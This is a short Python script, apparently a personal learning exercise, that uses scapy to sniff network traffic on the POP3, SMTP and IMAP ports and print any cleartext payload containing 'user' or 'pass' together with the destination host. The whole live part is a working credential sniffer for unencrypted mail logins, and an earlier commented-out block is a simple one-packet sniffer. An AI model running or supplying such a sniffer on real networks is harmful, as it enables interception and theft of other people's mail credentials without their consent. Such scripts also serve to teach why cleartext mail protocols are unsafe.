# -*- coding: utf-8 -*-
"""
Created on Sat Oct 30 11:14:28 2021

@author: kpdla
"""

"""
# a sniffer that sniffs a packet in the network and prints it.
from scapy.all import *

def pkt_c(p):
    print (p.show())

sniff(prn=pkt_c,count=1)
"""

from scapy.all import *


def pkt_c(pkt):
    if pkt[TCP].payload:                              #checking if we have any data payload
        m_pkt = bytes(pkt[TCP].payload)  #mail packet received in bytes
        m_pkt= m_pkt.decode("utf-8")     #conversion into strings
        print(m_pkt)
        if "user" in m_pkt.lower() or "pass" in m_pkt.lower():
            print ("HOST -1 : %s" % pkt[IP].dst)
            print (": %s" % pkt[TCP].payload)

sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=pkt_c,store=0)
